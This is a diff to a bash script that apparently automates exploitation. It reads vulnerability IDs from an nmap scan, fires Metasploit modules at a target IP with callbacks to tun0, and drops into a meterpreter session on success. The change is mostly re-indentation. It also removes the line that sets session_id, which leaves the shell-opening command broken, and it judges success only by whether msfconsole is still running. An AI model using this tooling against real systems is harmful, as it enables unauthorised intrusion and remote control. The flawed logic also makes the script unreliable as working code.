@@ -155,23 +155,24 @@ while read vuln; do
             read -ra exploits <<< "$chosenExploits"
 
             # Loop through the exploits and attempt to use them
-           for exploit in "${exploits[@]}"; do
-            if [ "$exploit_executed" = false ]
-            then
-                echo "Using exploit $exploit"
-                msfconsole -x "use $exploit; set LHOST tun0; set RHOSTS $IP; run" &
-                sleep 10 # Wait for the exploit to execute
-                if pgrep msfconsole > /dev/null
+            for exploit in "${exploits[@]}"; do
+                if [ "$exploit_executed" = false ]
                 then
-                    echo "Exploited vulnerability $vuln using exploit $exploit"
-                    exploitsFound=1
-                    exploit_executed=true
-                    break 2 # break out of both loops when an exploit is successfully executed
-                else
-                    echo "Failed to exploit vulnerability $vuln using exploit $exploit"
+                    echo "Using exploit $exploit"
+                    msfconsole -x "use $exploit; set LHOST tun0; set RHOSTS $IP; run" &
+                    sleep 10 # Wait for the exploit to execute
+                    if pgrep msfconsole > /dev/null
+                    then
+                        echo "Exploited vulnerability $vuln using exploit $exploit"
+                        exploitsFound=1
+                        exploit_executed=true
+                        break 2 # break out of both loops when an exploit is successfully executed
+                    else
+                        echo "Failed to exploit vulnerability $vuln using exploit $exploit"
+                    fi
                 fi
-            fi
-        done
+            done
+
             if [ "$exploitsFound" -eq 0 ]
             then
                 echo "Failed to exploit vulnerability $vuln using any of the available exploits"
@@ -182,7 +183,6 @@ while read vuln; do
     else
         echo "Search Results is empty"
     fi
-
     # Update progress bar
     percentage=$((count*100/total_vulns))
     printf "["
@@ -194,14 +194,11 @@ while read vuln; do
     if [ "$exploit_executed" = true ]
     then
         echo "Successfully exploited vulnerability $vuln. Opening shell..."
-        session_id=$(msfconsole -q -x "sessions -l" | grep -E '^\s*[0-9]+\s+meterpreter' | awk '{ print $1 }')
-        msfconsole -q -x "sessions -i $session_id; interact"
+        msfconsole -q -x "sessions -i $session_id; interact" 
         break
     fi
 
 done <<< "$(grep -oP '(CVE-\d+-\d+|ms\d+-\d+|cve-\d+-\d+|MS\d+-\d+)' nmap-scan.txt | sort -u)"
-
-
 
 
 if [ $exploitsFound = 0 ]
